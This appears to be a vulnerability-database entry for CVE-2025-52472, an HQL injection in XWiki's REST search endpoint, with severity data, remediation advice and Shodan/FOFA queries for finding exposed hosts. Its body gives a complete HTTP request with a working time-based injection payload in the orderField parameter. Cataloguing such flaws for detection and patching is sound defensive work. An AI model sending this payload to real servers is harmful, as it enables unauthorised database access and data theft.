---
layout: post
cve_id: CVE-2025-52472
title: XWiki - HQL Injection
pcap: true
pcap_path: /pcaps/2025/CVE-2025-52472.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2025/CVE-2025-52472.yaml
snort2_rule: N/A
snort3_rule: N/A
author: ritikchaddha
severity: high
impact: 'Unauthenticated attackers can inject malicious HQL queries through the orderField
  parameter, potentially leading to complete database compromise, data extraction,
  authentication bypass, or remote code execution.

  '
remediation: 'Update XWiki to a version that patches this vulnerability. Review and
  sanitize all user-controlled parameters that are used in database queries, especially
  those passed to HQL queries.

  '
reference:
- https://jira.xwiki.org/browse/XWIKI-23247
- https://nvd.nist.gov/vuln/detail/CVE-2025-52472
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2025-52472
  epss-score: 0.00513
  epss-percentile: 0.65935
  cwe-id: CWE-89
  cpe: cpe:2.3:a:xwiki:xwiki:*:*:*:*:*:*:*:*
metadata:
  verified: true
  max-request: 1
  vendor: xwiki
  product: xwiki
  shodan-query: html:"data-xwiki-reference"
  fofa-query: body="data-xwiki-reference"
tags:
- cve
- cve2025
- xwiki
- hqli
- sqli
- vkev
---

## üîç Vulnerability Description
XWiki is vulnerable to Hibernate Query Language (HQL) injection in the wiki and space search REST API starting in version 4.3-milestone-1 and prior to versions 16.10.9, 17.4.2, and 17.5.0. The vulnerability allows attackers to inject malicious HQL queries through the orderField parameter, potentially leading to data extraction, authentication bypass, or remote code execution depending on database backend and configuration.


## üåê HTTP Request
```nohighlight
GET /xwiki/rest/wikis/xwiki/search?q=test&scope=title&orderField=doc.fullName%20from%20XWikiDocument%20as%20doc%20where%20%24%24%3D%27%24%24%3Dconcat(chr(61)%2Cchr(39))%20and%20version()%7C%7Cpg_sleep(1)%3Dversion()%7C%7Cpg_sleep(1)%20and%20(1%3D1%20or%20%3F%3D%3F%20or%20%3F%3D%3F%20or%20%3F%3D%3F%20or%20%3F%3D%3F%20or%20%3F%3D%3F)%20--%20comment%27%20or%20a%3D%27%20order%20by%20doc.fullName HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

